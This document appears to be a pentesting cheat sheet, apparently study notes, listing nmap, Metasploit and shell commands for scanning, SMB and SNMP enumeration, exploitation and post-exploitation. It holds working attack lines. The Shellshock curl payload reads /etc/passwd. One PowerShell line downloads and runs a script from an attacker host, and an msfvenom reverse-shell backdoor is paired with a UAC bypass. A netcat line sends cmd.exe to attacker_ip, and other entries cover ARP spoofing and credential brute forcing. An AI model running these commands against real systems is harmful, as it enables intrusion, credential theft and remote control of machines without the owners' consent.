### 1.Scanning

#### 1.1 Most used nmap command
    - nmap -Pn -sn TARGET                 : Search all alive host with or without open ports 
    - nmap -sV -n TARGET                  : Fingerprint all exposed services
    - nmap -sV -n TARGET -p SEVICE_PORT   : Fingerprint a specific exposed service
    - nmap -O -n TARGET                   : Find Operating System
    - nmap -O -n TARGET                   : Find Operating System
    - nmap -sS -v --top-ports 1000        : Scan top 1000 ports

    
#### 1.2 Metasploit
    - auxiliary/scanner/smb/smb_version 
    - auxiliary/scanner/portscan/tcp

#### 1.3 Parsing NMAP scan
    - cat nmap.output | grep Up | cut -d' ' -f2 > scope.txt  : Search only live host after ping scan
    - cat scope.top1000.gnmap | grep ' 80/open' | cut -d' ' -f2

### 2.DNS Misconfiguration
    - dig @authorative_dns_server -t axfr DOMAIN              :    Exploiting zone transfer to display all subdomains
    - dig @authorative_dns_server axfr -x subNet (192.168)    :    Reverse DNS

### 3.SMB Misconfiguration

   #### 3.1 Collecting Info
    nmap -p445 --script smb-protocols TARGET
    nmap -p445 --script smb-security-mode TARGET
    nmap -p445 --script smb-enum-users  TARGET
    auxiliary/scanner/smb/smb_enumshares

    
   #### 3.2 Check Null session (Anynomous Access)
    smbclient -L IPTarget
    
   #### 3.3 Mounting SMB Share
     Mount shared drive : 
       - Linux   : mount -t cifs -o user=USER,password=PWD,rw //IP/share
       - Windows : net use K: \\IPTarget\SharedDrive

   #### 3.4 Metasploit
    exploit/windows/smb/psexec
    exploit/windows/smb/smb_relay


### 4.SNMP 
#### 4.1 Detection
    nmap -sU -p 161 Target

#### 4.2 Exploitation to guess community string and Collect Info
    nmap -sU -p 161 --script=snmp-brute Target
    snmpwalk -v 1 -c public Target
    nmap -sU -p 161 --script snmp-* Target > snmp_output

### 5.Exploitation

#### 5.1 Exploit ShellShock CVE-2014-6271 (suppose it is at /browser.cgi)
    nmap -sV -p80 --script http-shellshock --script-args uri=/browser.cgi,cmd='echo Content-Type: text/html; echo; /usr/bin/id' Target
    curl -H "user-agent: () { :; }; echo; echo; /bin/bash -c 'cat /etc/passwd'" http://Target/browser.cgi

#### 5.2 Other common exploits 
    - exploit/unix/ftp/proftpd_133c_backdoor for ProFTPD ==> Result in a shell
    - exploit/multi/misc/java_rmi_server ==> Result in a shell
    - auxiliary/scanner/mysql/mysql_authbypass_hashdump ==> dump mysql password hashes
    - exploit/windows/http/badblue_passthru for badblue 2.7 ==> Result in a shell
    - exploit/windows/http/rejetto_hfs_exec for hfs 2.3  ==> Result in a shell

### 6.Post Exploitation

#### 6.0 Infor Gathering
    run winenum
    run arp_scanner –r TargetNetworkSubnet
    run post/multi/gather/filezilla_client_cred
    run post/windows/gather/enum_applications

#### 6.1 Privilege Escalation

##### 6.1.1 MSF

    getsystem
    post/windows/gather/win_privs                : Check if UAC enabled
    exploit/windows/local/bypassuac              : Local exploit to bypass UAC
    post/multi/recon/local_exploit_suggester     : Find local exploit 
    exploit/multi/mysql/mysql_udf_payload        : if mysql running as root and we have the password
    incognito / mimikatz                         : Impersonate priviliged user

##### 6.1.2 Via Windows Services 
    
    - Manually : 
        Search all services    
              ==> wmic service where 'NOT PathName like '%system32%' ' GET PathName, Name > list_srv.txt       
        For each service check if user can write in the service Path 
              ==> icacls “Path”
    
    - Using powerUp.ps1 script in https://powersploit.readthedocs.io/en/latest/Privesc/
        - Import the script to the Victim in Powershell ==> iex (New-Object Net.WebClient).DownloadString('http://HackeIP/PowerUp.ps1')
        - Run Invoke-AllChecks
        - Take note of the AbuseFunction (example : PriviligedService)
        - Use the PriviligedService to run any OS Command for example create new Admin user : Invoke-ServiceAbuse -Name PriviligedService  -UserName testUser -Password password_123 -LocalGroup "Administrators"

##### 6.1.3 
    - Using the UACMe framework
        - Generate backdoor : msfvenom -p windows/meterpreter/reverse_tcp LHOST=10.10.15.2 LPORT=4444 -f exe > 'backdoor.exe'
        - Upload both backdoor.exe and UACMe executable
        - Akagi64.exe 23 C:\Users\admin\AppData\Local\Temp\backdoor.exe
    - 

#### 6.2 Pivoting
    From MSF Console          : route add 192.168.4.0 (subnet) 255.255.255.0(mask) 6(session)
    From metrerpreter         : run autoroute -s 192.168.4.0/24
    
    portfarwarding (meterpreter) ==>  portfwd add -l LocalPort -p ServicePort -r victimeIP (ex: portfwd add -l 1234 -p 80 -r 10.0.17.12)
    portfwd list    ==> This meterpreter command display current portforwarding
    ssh Port Forwarding ==>
        - ssh -4 -L 8000:127.0.0.1:3306 user@target    : Forward traffic going to specific port to another port on the Victim
        - ssh -D 9090 user@target                      : Open socks proxy listning on 9090
        
### 7.Bruteforcing

    Brutefore Using Hydra     : hydra -L users.txt -P /usr/share/metasploit-framework/data/wordlists/unix_passwords.txt TARGET smb
    SSH Using MSF             : auxiliary/scanner/ssh/ssh_login
    Brute Force MySQL         : use auxiliary/scanner/mysql/mysql_login
    Bruteforce SMB            : auxiliary/scanner/smb/smb_login

### 8.Lateral Movement
    RDP from kali                             : xfreerdp /u:guest_1 /p:guestpwd /v:Target
    Getiing shell from Windows using netcat   : 
            - On attacker machine  : nc -lvp 8080
            - On the victime       : nc attacker_ip 8080 -e cmd.exe 

### 9.Sniffing

    MiTM between vtcim1 & victm2 using arp poisonning:
        arpspoof -i tap0 -t vic1_IP -r vic2_IP
        arpspoof -i tap0 -t vic2_IP -r vic2_IP
